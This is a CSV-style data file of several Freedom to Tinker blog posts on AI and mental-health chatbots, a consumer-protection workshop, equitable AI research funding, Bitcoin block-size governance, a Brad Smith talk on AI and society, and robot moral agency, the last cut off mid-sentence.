"280","2017-10-18","2023-03-24","https://freedom-to-tinker.com/2017/10/18/ai-mental-health-care-risks-benefits-and-oversight-adam-miner-at-princeton/","How does AI apply to mental health, and why should we care? Today the Princeton Center for IT Policy hosted a talk by Adam Miner, ann AI psychologist, whose research addresses policy issues in the use, design, and regulation of conversational AI in health. Dr. Miner is an instructor in Stanford’s Department of Psychiatry and Behavioral Sciences, and KL2 fellow in epidemiology and clinical research, with active collaborations in computer science, biomedical informatics, and communication. Adam was recently the lead author on a paper that audited how tech companies’ chatbots respond to mental health risks. Adam tells us that as a clinical psychologist, he’s spent thousands of hours treating people for anything from depression to schizophrenia. Several years ago, a patient came to Adam ten years after experiencing a trauma. At that time, the person they shared it with shut them down, said that’s not something we talk about here, don’t talk to me. This experience kept that person away from healthcare for 10 years. What might it have meant to support that person a decade earlier? American Healthcare in Context The United States spends more money on healthcare than any other country; other countries 8% on their healthcare, and the US spends twice as much– about 20 cents on the dollar for every dollar in the economy. Are we getting the value we need for that? Adam points out that other countries that spend half as much on healthcare are living longer. Why might that be? In the US, planning and delivery is hard. Adam cites a study noting that people’s needs vary widely over time. In the US, 60% of adults aren’t getting access to mental health care, and many young people don’t get access to what they need. In mental health, the average delay between onset of symptoms and interventions is 8-10 years. Mental health care also tends to be concentrated in cities rather than rural areas. Furthermore, the nature of some mental health conditions (such as social anxiety) creates barriers for people to actually access care. The Role of Technology in Mental Health Where can AI help? Adam points out that technology may be able to help with both issues: increase the value of mental health care, as well as improve access. When people talk about AI and mental health, the arguments fall between two extremes. On one side, people argue that technology is increasing mental health problems. On the other side, researchers argue that tech can reduce problems: research has found that texting with friends or strangers can reduce pain; people used less painkiller when texting with others. Technologies such as chatbots are already being used to address mental health needs, says Adam, trying to improve value or access. Why would this matter? Adam cites research that when we talk to chatbots, we tend to treat them like humans, saying please or thank you, or feeling ashamed if they don’t treat us right. People also disclose things about their mental health to bots. In 2015, Adam led research to document and audit the responses of AI chatbots to set phrases, “I want to commit suicide,” “I was raped,” “I was depressed.” To test this, Adam and his colleagues walked into phone stores and spoke the phrases into 86 phones, testing Siri, Cortana, Google Now, and S Voice. They monitored whether the chatbot acknowledged the statement or not, and whether it referred someone to a hotline. Only one of the agents, Cortana, responded to a claim of rape with a hotline, only two of them recognized a statement about suicide. Adam shows us the rest of the results: What did the systems say? Some responses pointed people to hotlines. Other responses responded in a way that wasn’t very meaningful. Many systems were confused and forwarded people to search engines. Why did they use phones from stores? Conversational AI systems adapt to what people have said in the past, and by working with display phones, they could get away from their own personal histories. How does this compare to search? The Risks of Fast-Changing Software Changes on Mental Health After Adam’s team posted the audit, the press picked up the story very quickly, and platforms introduced changes within a week. That was exciting, but it was also concerning; public health interventions typically take a long time to be debated before they’re pushed out, but Apple can reach millions of phones in just a few days. Adam argues that conversational AI will have a unique ability to influence health behavior at scale. But we need to think carefully about how to have those debates, he says. In parallel to my arguments about algorithmic consumer protection, Adam argues that regulations such as federal rules governing medical devices, protected health information, and state rules governing scope of practice and medical malpractice liability have not evolved quickly enough to address the risks of this approach. Developing Wise, Effective, Trustworthy Mental Health Interventions Online Achieving this kind of consumer protection work needs more than just evaluation, says Adam. Because machine learning systems can embed biases, any conversational system for mental health could only be activated for certain people and certain cultures based on who developed the models and trained the systems. Designing well-working systems will require some way to identify culturally-relevant crisis language, we need ways to connect with the involved stakeholders, and find ways to evaluate these systems wisely. Adam also takes the time to acknowledge the wide range of collaborators he’s worked with on this research."
"281","2016-11-08","2023-03-24","https://freedom-to-tinker.com/2016/11/08/new-workshop-on-technology-and-consumer-protection/","[Joe Calandrino is a veteran of Freedom to Tinker and CITP. As long time readers will remember, he did his Ph.D. here, advised by Ed Felten. He recently joined the FTC as research director of OTech, the Office of Technology Research and Investigation. Today we have an exciting announcement. — Arvind Narayanan.] Arvind Narayanan and I are thrilled to announce a new Workshop on Technology and Consumer Protection (ConPro ’17) to be co-hosted with the IEEE Symposium on Security and Privacy (Oakland) in May 2017: Advances in technology come with countless benefits for society, but these advances sometimes introduce new risks as well. Various characteristics of technology, including its increasing complexity, may present novel challenges in understanding its impact and addressing its risks. Regulatory agencies have broad jurisdiction to protect consumers against certain harmful practices (typically called “deceptive and unfair” practices in the United States), but sophisticated technical analysis may be necessary to assess practices, risks, and more. Moreover, consumer protection covers an incredibly broad range of issues, from substantiation of claims that a smartphone app provides advertised health benefits to the adequacy of practices for securing sensitive customer data. The Workshop on Technology and Consumer Protection (ConPro ’17) will explore computer science topics with an impact on consumers. This workshop has a strong security and privacy slant, with an overall focus on ways in which computer science can prevent, detect, or address the potential for technology to deceive or unfairly harm consumers. Attendees will skew towards academic and industry researchers but will include researchers from government agencies with a consumer protection mission, including the Federal Trade Commission—the U.S. government’s primary consumer protection body. Research advances presented at the workshop may help improve the lives of consumers, and discussions at the event may help researchers understand how their work can best promote consumer welfare given laws and norms surrounding consumer protection. We have an outstanding program committee representing an incredibly wide range of computer science disciplines—from security, privacy, and e-crime to usability and algorithmic fairness—and touching on fields across the social sciences. The workshop will be an opportunity for these different disciplinary perspectives to contribute to a shared goal. Our call for papers discusses relevant topics, and we encourage anyone conducting research in these areas to submit their work by the January 10 deadline. Computer science research—and computer security research in particular—excels at advancing innovative technical strategies to mitigate potential negative effects of digital technologies on society, but measures beyond strictly technical fixes also exist to protect consumers. How can our research goals, methods, and tools best complement laws, regulations, and enforcement? We hope this workshop will provide an excellent opportunity for computer scientists to consider these questions and find even better ways for our field to serve society."
"282","2022-03-09","2023-03-24","https://freedom-to-tinker.com/2022/03/09/calling-for-investing-in-equitable-ai-research-in-nations-strategic-plan/","By Solon Barocas, Sayash Kapoor, Mihir Kshirsagar, and Arvind Narayanan In response to the Request for Information to the Update of the National Artificial Intelligence Research and Development Strategic Plan (“Strategic Plan”) we submitted comments providing suggestions for how the Strategic Plan for government funding priorities should focus resources to address societal issues such as equity, especially in communities that have been traditionally underserved. The Strategic Plan highlights the importance of investing in research about developing trust in AI systems, which includes requirements for robustness, fairness, explainability, and security. We argue that the Strategic Plan should go further by explicitly including a commitment to making investments in research that examines how AI systems can affect the equitable distribution of resources. Specifically, there is a risk that without such a commitment, we make investments in AI research that can marginalize communities that are disadvantaged. Or, even in cases where there is no direct harm to a community, the research support focuses on classes of problems that benefit the already advantaged communities, rather than problems facing disadvantaged communities. We make five recommendations for the Strategic Plan: First, we recommend that the Strategic Plan outline a mechanism for a broader impact review when funding AI research. The challenge is that the existing mechanisms for ethics review of research projects – Institutional Review Boards (“IRB”) – do not adequately identify downstream harms stemming from AI applications. For example, on privacy issues, an IRB ethics review would focus on the data collection and management process. This is also reflected in the Strategic Plan’s focus on two notions of privacy: (i) ensuring the privacy of data collected for creating models via strict access controls, and (ii) ensuring the privacy of the data and information used to create models via differential privacy when the models are shared publicly. But both of these approaches are focused on the privacy of the people whose data has been collected to facilitate the research process, not the people to whom research findings might be applied. Take, for example, the potential impact of face recognition for detecting ethnic minorities. Even if the researchers who developed such techniques had obtained approval from the IRB for their research plan, secured the informed consent of participants, applied strict access control to the data, and ensured that the model was differentially private, the resulting model could still be used without restriction for surveillance of entire populations, especially as institutional mechanisms for ethics review such as IRBs do not consider downstream harms during their appraisal of research projects. We recommend that the Strategic Plan include as a research priority supporting the development of alternative institutional mechanisms to detect and mitigate the potentially negative downstream effects of AI systems. Second, we recommend that the Strategic Plan include provisions for funding research that would help us understand the impact of AI systems on communities, and how AI systems are used in practice. Such research can also provide a framework for informing decisions on which research questions and AI applications are too harmful to pursue and fund. We recognize that it may be challenging to determine what kind of impact AI research might have as it affects a broad range of potential applications. In fact, many AI research findings will have dual use: some applications of these findings may promise exciting benefits, while others would seem likely to cause harm. While it is worthwhile to weigh these costs and benefits, decisions about where to invest resources should also depend on distributional considerations: who are the people likely to suffer these costs and who are those who will enjoy the benefits? While there have been recent efforts to incorporate ethics review into the publishing processes of the AI research community, adding similar considerations to the Strategic Plan would help to highlight these concerns much earlier in the research process. Evaluating research proposals according to these broader impacts would help to ensure that ethical and societal considerations are incorporated from the beginning of a research project, instead of remaining an afterthought. Third, our comments highlight the reproducibility crisis in fields adopting machine learning methods and the need for the government to support the creation of computational reproducibility infrastructure and a reproducibility clearinghouse that sets up benchmark datasets for measuring progress in scientific research that uses AI and ML. We suggest that the Strategic Plan borrow from the NIH’s practices to make government funding conditional on disclosing research materials, such as the code and data, that would be necessary to replicate a study. Fourth, we focus attention on the industry phenomenon of using a veneer of AI to lend credibility to pseudoscience as AI snake oil. We see evaluating validity as a core component of ethical and responsible AI research and development. The strategic plan could support such efforts by prioritizing funding for setting standards for and making tools available to independent researchers to validate claims of effectiveness of AI applications. Fifth, we document the need to address the phenomenon of “runaway datasets” — the practice of broadly releasing datasets used for AI applications without mechanisms of oversight or accountability for how that information can be used. Such datasets raise serious privacy concerns and they may be used to support research that is counter to the intent of the people who have contributed to them. The Strategic Plan can play a pivotal role in mitigating these harms by establishing and supporting appropriate data stewardship models, which could include supporting the development of centralized data clearinghouses to regulate access to datasets."
"283","2015-05-11","2023-03-24","https://freedom-to-tinker.com/2015/05/11/bitcoin-faces-a-crossroads-needs-an-effective-decision-making-process/","Joint post with Andrew Miller. Virtually unknown outside the Bitcoin community, a debate is raging about whether or not to increase the maximum size of Bitcoin blocks. Blocks are created in Bitcoin roughly once every ten minutes and are currently limited to a size of 1 megabyte, putting a limit on the rate at which the network can handle transactions. At first sight this might seem like a technical decision for the developers to make and indeed it’s largely being treated that way. In reality, it has far-reaching consequences for the Bitcoin ecosystem as it is the first truly contentious decision the Bitcoin community has faced. In fact, the manner in which the community reaches — or fails to reach — consensus on this issue may set a crucial precedent for Bitcoin’s long-term ability to survive, adapt, grow, and govern itself. [1] If the Bitcoin protocol is decentralized and no one controls it, then how can it be changed at all? You may know that Bitcoin is a decentralized system and that no single company, government, or entity controls it. In that sense it’s a lot like the Internet. But unlike the Internet, which is an ad-hoc collection of networks and protocols, and thus can be gradually upgraded piecemeal, all Bitcoin nodes are basically part of one giant distributed computation which means that upgrades need to be much more tightly — dare we say centrally — coordinated. The default Bitcoin software, Bitcoin Core, is that point of coordination. The five Core developers have a huge amount of power in determining how the network operates and in making upgrades to it. The developers don’t have all the power though — if changes made to Bitcoin Core are contentious, people running the software are free to go their own way, creating a “fork”. The distribution of power between the different entities in the Bitcoin ecosystem is fascinating and intricate, and we encourage you to take a look at Chapter 7, “Community, Politics, and Regulation” of our Bitcoin textbook-in-progress or the corresponding sections of the video lecture. The bottom line, though, is that while changing the Bitcoin protocol can and does happen, it requires consensus of a social kind. This is related to but different from the technical consensus protocol that Bitcoin miners execute. There are numerous stakeholders in the block size debate with widely differing incentives Most of the time, protocol changes are purely technical decisions. They might be deployed to increase the network’s efficiency or prevent potential attacks, so no one has a specific reason to oppose them beyond the general risk of making changes which may introduce new bugs or cause incompatible clients to diverge. But the block size debate is different. A decision to change the current policy of a fixed 1MB block size would affect virtually every group of Bitcoin stakeholders and, moreover, it would affect them differently. At a high level, Bitcoin will likely evolve in different directions depending on whether the block size limit remains fixed or is increased. [2] With a fixed block size, transactions will become increasingly expensive because space for transactions on the block chain will become scarce. That means the Bitcoin network may be limited, directly handling only a few types of transactions such as settlement transactions between financial intermediaries. Transactions representing everyday purchases (“buying coffee with Bitcoin”) will get pushed off the main network into “side chains” or off-chain payment channels. Various companies have made bets on one or the other future. Some have developed alternative blockchains or payment channels that would thrive in a fixed-block-size world whereas others such as Bitcoin payment processors stand to benefit from a growing block size that accommodates everyday transactions. Another high-level impact is on mining: larger blocks will favor bigger miners. Bigger miners can more easily absorb fixed costs of storing larger blocks and verifying more transactions. More importantly, they can invest more in the necessary network infrastructure to quickly retrieve large blocks and can “peer” with other large miners directly to avoid costly delays in hearing about new blocks. Smaller miners will face higher processing costs as well as increased propagation delays on the public Bitcoin peer-to-peer network. Ultimately, many may drop out entirely. The resulting centralization of mining may leave the system more open to a 51% attack, making security worse for everyone. Similarly, it’s been argued that the number of independent entities running “full nodes” will decrease because of the increased storage and bandwidth, again weakening the decentralization and security of the system. Finally, some of the development community’s implicit criteria are informed by the development process itself. For example, Gavin Andresen explains that proposal to increase the limit to 20MB is the “the simplest possible set of changes that will work,” and therefore the easiest to pass testing and code review. On the other hand, core developer Pieter Wuille has expressed concern that this increase is a stopgap solution, ultimately creating more “technical debt” to pay off later. Resolving the block size debate — and similar contentious issues in the future — requires effective governance A popular perception in the Bitcoin community is that Bitcoin doesn’t need governance, or at least structured governance. While Bitcoin may not need traditional governments, the very consensus process by which Bitcoin operates is an example of governance. So far, that governance has operated loosely without much formal structure — and this has worked well. The key point of this post is that Bitcoin is now at a stage where the current process is no longer adequate. The block size debate is the first time in Bitcoin’s history that a change is being contemplated that will steer the ship in one of two (or more) very different directions. Virtually every participant in the Bitcoin ecosystem is touched by it, and their incentives are not all aligned. Keeping the block size constant is not the simple “status quo” option it may appear to be. Due to continuously increasing transaction volume, Bitcoin will surely change significantly even if nothing is done. The debate is an old one within the community, but it has now started to become urgent. [3] And while this might be the first such contentious issue, it won’t be the last: a decision will need to be made on sidechains soon, attacks might be discovered that can’t be fixed to everyone’s satisfaction, and over the long run there’s always the question of whether mining will survive the repeated halving of block rewards or whether some changes are necessary. What do we want out of a governance process for deciding debates such as this? First, every stakeholder’s voice should be heard. Not only should it be technically possible for them to air their views, but the community should actively and systematically seek their input. Second, it should be clear how different stakeholders’ views were weighed against each other and how trade-offs were made. Third, the stakeholders and other observers should be convinced that there were no back-channels to the Core developers — who are, after all, the ones with the technical ability to push changes. Fourth, there should be a transparent transcript of all the inputs and the decision-making process, so that if the decision that was made turns out to be sub-optimal, there’s a way to revisit it using the logs and learn lessons for the future. Bitcoin’s current governance model is seriously inadequate So far, the bitcoin-developers mailing list has been the primary place for discussion of technical changes to Bitcoin, augmented by the Bitcoin Improvement Proposal (BIP) process, GitHub’s issue tracker, IRC channels, and a “long tail” of other avenues: the Bitcointalk forum, blog posts, Twitter, Reddit, and, of course, conferences and other physical meetings. While this model worked great as long as proposed changes were purely technical, it breaks down for contentious issues. In fact, it satisfies virtually none of the criteria we laid out above. First of all, many stakeholders such as miners aren’t participating in the debate, either because they’re not aware of the effect of the decision on their interests or because they don’t realize they have a voice. The Core developers seem to do their best to take miners’ views into account, but often this amounts to informed guessing. None of the groups other than developers post regularly on the developer mailing list, which is entirely natural — the interface isn’t familiar to non-developers, resulting in a lot of friction, not to mention a lot of noise considering that the vast majority of discussions are about technical issues of no interest to non-developers. Miners sometimes post on the Bitcointalk forum, but for the most part they don’t voice their views publicly. As for Bitcoin companies, venture capitalists, and other relatively privileged groups, their best way to influence the decision is to communicate directly, and perhaps privately, with the developers. Furthermore, the plethora of public channels ironically serves to decrease transparency. It’s not clear which of these are noticed — and valued — by the developers. And there’s the danger that whoever shouts the loudest will drown out other more reasonable voices. As a result, what’s happened so far is this: the block size debate has been up in the air for years (for example, see this thread from October 2013). Developers seem to have waited for technical consensus to occur naturally — as it usually does — perhaps not fully realizing the extent to which this debate is different from the purely technical ones of the past. Everyone who is speaking now has already weighed in, while a variety of others who should be heard from have still today remained silent. It’s not clear to anyone how the decision will ever be made and a bit of panic is starting to set in. [4] Bitcoin urgently needs formal governance Structurelessness is a myth. [5] What we’ve been seeing is Bitcoin’s latent, informal governance structure manifest itself. While it’s been effective for most decisions, in this case it’s led to confusion and inaction. The only way out of this mess is more explicit, well thought out, structured governance. Of course, that’s going to be a tough pill to swallow, both because of the politics of many in the Bitcoin community and because of what happened with the Bitcoin Foundation. The allegations of corruption and lack of transparency the Foundation has faced are precisely the kinds of things that can go wrong with formal governance. A crucial difference, though, is that the Bitcoin Foundation focused on loosely defined goals like advocacy rather than protocol changes to Bitcoin. A governance process for Bitcoin Core — and nothing else — could be far more light-weight and transparent. Hopefully, if it worked well, it would only need to be invoked occasionally. Rejecting governance altogether is not an option. To meet the challenges now facing it — to grow up — Bitcoin will have to develop effective governance. The current debate, then, is a rite of passage. Three suggestions for better governance In keeping with the light-weight yet formal approach to governance we’ve suggested, here are three suggestions for more effective governance for Bitcoin Core. We intend these to be a starting point for discussion. Note that each of these can be adopted individually. 1. Form a technical advisory board. Many open-source projects utilize an advisory board as one governance mechanism. For Bitcoin Core, the goal would be to bring the different types of stakeholders together to deliberate major or controversial decisions. For each such change, the board will produce a document that describes the inputs, the output(s), and the criteria that were used to make the decision — especially who the stakeholders are, their opinions and interests, and how their interests were weighed. By being more methodical, the advisory board’s deliberations would hopefully also be more scientific than the current process. [6] The output of the advisory board wouldn’t be binding in any way on the Core developers, but if Bitcoin Core departs in a significant way from the advisory board’s recommendations, then it’s a sign that something is seriously wrong. 2. Create a polling mechanism and a public comment process. Let’s make better use of Bitcoin’s unprecedented capability to have built-in voting and opinion polling mechanisms. The challenge of Bitcoin governance is actually a great opportunity, since Bitcoin’s technical innovations include new tools for effective governance! For example, miners can express their preferences and vote on decisions by putting data into block headers (in other words, votes are weighted by proof-of-work). This has already used by Core developers in the rare “soft-fork” upgrade procedure, but proof-of-work voting could also be used more frequently even when it isn’t so urgent. Investors — people who hold bitcoins — can similarly vote via proof-of-stake. Regular users running Bitcoin nodes could vote if a polling mechanism is built into Bitcoin Core, although this would require some way to prevent sybil attacks. All these stakeholders are important, so no one voting mechanism is superior to the others. None of these votes would be binding and they’re better thought of as opinion polls. The idea is to give the Core developers actual data on how each contingent feels about a decision, and to collect such data in ways that can’t be easily gamed. We also recommend a public comment process analogous to what most federal agencies use to solicit inputs for decision-making. This would give a voice to merchants, payment services, exchanges, and other such entities whose opinions can’t be as easily captured through built-in polling mechanisms. Public comments would be written documents as opposed to votes. Unlike polling, these would not be anonymous and, indeed, the identity of the respondents would be important for evaluating the comments. 3. Reach consensus on evaluation criteria and tradeoffs in advance of the actual discussion. In a way, this is the most important suggestion — it directly addresses the reason why we think the block size debate is currently going nowhere. Instead of simply re-hashing the not-directly-comparable pluses and minuses of each option, the community must first reach consensus on how competing interests will be balanced against each other. The first two suggestions can be seen as ways to make this easier, but even in their absence, “meta-discussion” is essential to break out of the gridlock. In summary, the current block size debate has made it clear that the decision-making process for the Bitcoin protocol is lacking. But the need for structured governance was anticipated long ago in a paper by Kroll, Davey and Felten at Princeton. [7] The problems we’ve pointed out aren’t new and some Bitcoin developers have already at times hinted at the need for improvement (for example, here’s Matt Corallo’s post about the need for discussing decision criteria, incentives, etc). But sometimes it’s more apparent from the outside when a process needs to change and adapt. We hope the suggestions we’ve laid out will be a starting point for some much-needed changes. [1] Gavin Andresen has been the main public proponent of increasing the block size. His blog post earlier this year addressing the technical feasibility of a block size increase (and acknowledging that “economic arguments” remained) kicked off the latest round of debate, which has reached a crescendo over the last week. [2] We’re simplifying a bit and considering only the two main options: keeping the block size fixed vs. growing it indefinitely as necessary over time to accommodate demand. There are various other possibilities such as allowing the market to decide the size of each block. For some examples, see here. [3] The chart is a projection of when the current limit will become insufficient, but some have suggested that things could come to a head far sooner, say due to a flooding attack. [4] For example, Mike Hearn is quite pessimistic about the ability of the developer community to reach consensus. [5] The link goes to a famous essay reflecting on the feminist movement in the 1960s. The movement resisted organizational structure, viewing structure as oppressive. The author argues that structureless groups don’t exist, that the only choice is between formal and informal structure, and that formal structure is necessary for effective action, especially in large groups. The similarities to Bitcoin’s current quandary are remarkable. [6] Emin Gün Sirer has also suggested a Technical Advisory Board. Some of his other Tweets on the topic: “The #Bitcoin blocksize debate, at the moment, is being waged in a way that has nothing to do with science. A TAB can help refocus.” and “The most critical thing to do on the #Bitcoin dev front is to help elevate the discussion, from half-baked forum posts to proper science.” [7] The paper identified the dwindling block reward as the key challenge that would require governance. However, much of what they said parallels what we’ve said here about the block size debate: “…we argue that Bitcoin will require the emergence of governance structures, contrary to the commonly held view in the Bitcoin community that the currency is ungovernable.” “The only way to preserve the system’s health will be to change the rules … Different groups benefit from each solution … The choice is likely to drive political disputes within the Bitcoin community … A political choice such as this is difficult to make without some sort of governance structure, even if an informal one.” The authors also point out that: “Other challenges to the system’s health and viability may also emerge, perhaps due to issues of scaling or security.” The block size is, of course, primarily a scaling issue."
"284","2018-03-02","2023-03-24","https://freedom-to-tinker.com/2018/03/02/the-rise-of-artificial-intelligence-brad-smith-at-princeton-university/","What will artificial intelligence mean for society, jobs, and the economy? Speaking today at Princeton University is Brad Smith, President and Chief Legal Officer of Microsoft. I was in the audience and live-blogged Brad’s talk. CITP director Ed Felten introduces Brad’s lecture by saying that the tech industry is at a crossroads. With the rise of AI and big data, people have realized that the internet and technology are having a big, long-term effect on many people’s lives. At the same time, we’ve seen increased skepticism about technology and the role of the tech industry in society. The good news, says Ed, is that plenty of people in the industry are up to the task of explaining what the industry does to cope with these problems in a productive way. What the industry needs now, says Ed, is what Brad offers: a thoughtful approach to the challenges that our society faces, acknowledges the role of tech companies, seeks constructive solutions, and takes responsibility that works across society. If there’s one thing we could to to help the tech industry cope with these questions, says Ed, it would be to clone Brad. Imagining Artificial Intelligence in Thirty Years Brad opens by mentioning the new book by his team: The Future Computed Artificial Intelligence and its Role in Society. While writing the book, they realized that it’s not helpful to think about change in the next year or two. Instead, we should be thinking about periods of ten to thirty years. What was life like twenty years ago? In 1998, people often began their day without anything digital. They would put on a television, listen to the radio, and pull out a calendar. If you needed to call someone, you would use a land phone to reach them. At that time, the single common joke was about whether they could program their VCR machines. In 2018, the first thing that many people reach for is their phone. Even if you manage to keep your phone in another room, you’ll find yourself reaching for your phone or sitting down in front of your laptop. You now use those devices to find out what happened in the world and with your friends. What will the world look like in 2038? By that time, Brad argues that we’ll be living with artificial intelligence. Digital assistants are already part of our lives, but they’ll be more common at that time. Rather than looking at lots of apps, we’ll have a digital assistant that will talk to us and tell us what the traffic will be like for us. Twenty years from now, you’ll probably have your digital assistant talking to you as you shave or put on your makeup in the morning. What is Artificial Intelligence? To understand what that mean in our lives, we need to understand what artificial intelligence really is. Even today, computers can recognize people, and they can do more – they can make sense of someone’s emotions from their face. We’ve seen the same with the ability of computers to understand language, Brad says. Not only can computers recognize speech, they can also sift through knowledge, make sense of it, and reach conclusions. In the world today, we read about AI and expect it all to arrive one day, says Brad. That’s not how it’s going to work- AI will become more and more part of our lives in pieces. He tells us about the BMW pedestrian alert, which allows cars to detect pedestrians, beep, signal to the driver, and apply its brakes. Brad also tells us about the Steno app, which records and transcribes. Microsoft now has a version of Skype that detects and auto-translates the conversation– something they’ve now integrated with Powerpoint. Spotify, Netflix, and iTunes all use artificial intelligence to deliver suggestions for the next TV show. None of these systems work with 100% perfection, but neither do human beings. When asking about an AI system, we need to ask when computers will become as good as a human being. What advances make AI real? Microsoft Amazon, Google, and others build data centers that are many football fields large in space. This enables companies to gather huge computational power and vast amounts of data. Because algorithms get better with more data, companies have an insatiable appetite for data. The Challenges of Imagining the Future All of this is exciting, says Brad, and could deliver huge promise for the world. But we can’t afford to look at this future with uncritical eyes. The world needs to make sense of the risks. As computers behave more like humans, what will that mean for real people? Many people like Stephen Hawking, Elon Musk, and others are warning us about that future. But there is no crystal ball. For a long time, says Brad, I’ve admired futurists, but if a futurist gets something wrong, probably nobody remembers they got it wrong. We may be able to discern patterns, but nobody has a crystal ball. Learning from The History of the Automobile How can we think about what may be coming? The first option is to learn from history– not because it repeats itself but because it provides insights. To illustrate this, Brad starts by talking about the transition from horses to automobiles. He shows us a photo of Bertha Benz, whose dowry paid for her husband Karl’s new business. One morning in 1888, she got up and left her husband a note saying that she was taking the car and driving the kids 70 kilometers to visit her mother. Before the day was over, she had to repair the car, but by the end of the day, they had reached her mother’s house. This stunt convinced the world that the automobile would be important to the future. Next, Brad shows us a photo of New York City in 1905, with streets full of horses and hardly any cars. Twenty years later, there were no horses on the streets. The horse population declined and jobs involved in supporting them disappeared. These direct economic effects weren’t as important as the indirect effects. Consumer credit wasn’t necessarily connected to the automobile, but it was an indirect outcome. Once people wanted to buy cars, they needed a way to finance the cars. Advertising also changed: when people were driving past billboards at speed, advertisers invented logos to make their companies more recognizable. How Institutions Evolve to Meet Technology & Economic Changes The effects of the automobile weren’t all good. As the population of horses declined, farmers got smart and grew less hay. They shifted their acre-age to wheat and corn and the prices plummeted. Once the prices plummeted, farmers’ income plummeted. As the farmers fell behind on their loans, the rural banks tried to foreclose them, leading to broad financial collapse. Many of the things we take for granted today come from that experience: the FDIC and insurance regulation, farm subsidies, and many other parts of our infrastructure. With AI, we need to be prepared for changes as substantial. Understanding the Impact of AI on the Economy Brad tells us another story about how offices worked. In the 1980s, you handed someone a hand-written document and someone would type it for you. Between the 1980s and today, two big changes happened. First, secretarial staff went on the decline and the professional IT staff was born. Second, people realized that everyone needed to understand how to use computers. As we think about how work will change, we need to ask what jobs AI will replace. To answer this question, let’s think about what computers can do well: vision, speech, language knowledge. Jobs involving decision-making are already being done by computers (radiology, call centers, fast food orders, auto drivers). Jobs involving translation and learning will also become automated, including machinery inspection and the work of paralegals. At Microsoft, the company used to have multiple people whose job was to inspect fire extinguishers. Now the company has devices that automatically record data on their status, reducing the work involved in maintaining them. Some jobs are less likely to be replaced by AI, says Brad: anything that requires human understanding and empathy. Nurses, social workers, therapists, and teachers are more likely to be people who will use AI than be replaced by it. This may lead people to take on jobs that they take more satisfaction in doing. Some of the most exciting developments for AI in the next five years will be in the area of disability. Brad shows us a project called “Seeing AI,” offers an app that describes a person’s surroundings using a phone camera. The app can read barcodes and identify food, identify currency bills, describe a scene, and read text in one’s surroundings. What’s exciting is what it can do for people. The project has already carried out 3 million tasks and it’s getting better and smarter as it goes. This system could be a game changer for people with blindness, says Brad. Why Ethics Will Be a Growth Area for AI What jobs will AI create? It’s easier to think about the jobs it will replace than what it will create. When young people in Kindergarten today enter the workplace, he says, the majority of jobs will be ones that don’t yet exist. Some of the new jobs will be ones that support AI to work: computer science, data science, and ethics. “Ultimately, the question is not only what computers *can* do” says Brad, “it’s what computers *should* do.” Under the ethics of AI, the fields of reliability/safety and privacy/security are well developed. Other important areas that are less well developed are research on fairness, inclusiveness. Two issues underly all the rest. Transparency is important because the world needs to know how those systems will work– people need to understand how they work. AI Accountability and Transparency Finally, one of the most important questions of our time is: “how do we ensure accountability of machines”- will we ensure that machines will be accountable to people, and will those people be accountable to other people? Only with accountability will be able to What would it mean to create a hippocratic oath for AI developers? Brad asks: what does it take to train a new generation of people to work on AI with that kind of commitment and principle in mind? These aren’t just questions for people at big tech companies. As companies, governments, universities, and individuals take the building blocks of AI and use them, AI ethics are becoming important to every part of society. Artificial Intelligence Policy If we are to stay true to timeless values, says Brad, we need to ask the question about whether we only want ethical people to behave ethically, or everyone to behave ethically? That’s what law does; AI will create new questions for public policy and the evolution of the law. That’s why skilling up for the future isn’t just about science, technology, engineering, and math: as computers behave more like humans, the social sciences and humanities will become even more important. That’s why diversity in the tech industry is also important, says Brad. How AI is Transforming the Liberal Arts, Engineering, and Agriculture Brad encourages us to think about disciplines that AI can make more impactful: Ai is changing healthcare (cures for cancer), agriculture (precision farming), accessibility, and our environment. He concludes with two examples. First, Brad talks about the Princeton Geniza Lab, led by Marina Rustow, who are using AI to analyze documents that have been scattered all around the world. Using AI, researchers are joining these digitized fragments. Engineering isn’t only for the engineers– everybody in the liberal arts can benefit from learning a little bit of computer science and data science, and every engineer is going to need some more liberal arts in their future. Brad also tells us about the AI for Earth project which provides seed funds to researchers who work on the future of the planet. Projects include smart grids in Norway that make energy usage more efficient, a project by the Singaporean government to do smart climate control in buildings, and a project in Tasmania that supports precision farming, saving 30% on irrigation costs. These examples give us a glimpse on what it means to prepare for an AI powered future, says Brad. We’re also going to need to do more work: we may need a new social contract, because people are going to need to learn new skills, find new career pathways, create new labor rules and protections, and rethink the social safety net as these changes ripple throughout the economy. Creating the Future of Artificial of Intelligence Where will AI take us? Brad encourages students to think about the needs of the world and what AI has to offer. It’s going to take a whole generation to think through what AI has to offer and create that future, and he encourages today’s students to sieze that challenge."
"285","2015-08-12","2023-03-24","https://freedom-to-tinker.com/2015/08/12/robots-dont-threaten-but-may-be-useful-threats/","Hi, I’m Joanna Bryson, and I’m just starting as a fellow at CITP, on sabbatical from the University of Bath. I’ve been blogging about natural and artificial intelligence since 2007, increasingly with attention to public policy. I’ve been writing about AI ethics since 1998. This is my first blog post for Freedom to Tinker. Will robots take our jobs? Will they kill us in war? The answer to these questions depends not (just) on technological advances – for example in the area of my own expertise, AI – but in how we as a society determine to view what it means to be a moral agent. This may sound esoteric, and indeed the term moral agent comes from philosophy. An agent is something that changes its environment (so chemical agents cause reactions). A moral agent is something society holds responsible for the changes it effects. Should society hold robots responsible for taking jobs or killing people? My argument is “no”. The fact that humans have full authorship over robots‘ capacities, including their goals and motivations, means that transferring responsibility to them would require abandoning, ignoring or just obscuring the obligations of humans and human institutions that create the robots. Using language like “killer robots” can confuse the tax-paying public already easily lead by science fiction and runaway agency detection to believing that robots are sentient competitors. This belief ironically serves to protect the people and organisations that are actually the moral actors. So robots don’t kill or replace people; people use robots to kill or replace each other. Does that mean there’s no problem with robots? Of course not. Asking whether robots (or any other tools) should be subject to policy and regulation is a very sensible question. In my first paper about robot ethics (you probably want to read the 2011 update for IJCAI, Just an Artifact: Why Machines are Perceived as Moral Agents), Phil Kime and I argued that as we gain greater experience of robots, we will stop reasoning about them so naïvely, and stop ascribing moral agency (and patiency [PDF, draft]) to them. Whether or not we were right is an empirical question I think would be worth exploring – I’m increasingly doubting whether we were. Emotional engagement with something that seems humanoid may be inevitable. This is why one of the five Principles of Robotics (a UK policy document I coauthored, sponsored by the British engineering and humanities research councils) says “Robots are manufactured artefacts. They should not be designed in a deceptive way to exploit vulnerable users; instead their machine nature should be transparent.” Or in ordinary language, “Robots are artifacts; they should not be designed to exploit vulnerable users by evoking an emotional response or dependency. It should always be possible to tell a robot from a human.” Nevertheless, I hope that by continuing to educate the public, we can at least help people make sensible conscious decisions about allocating their resources (such as time or 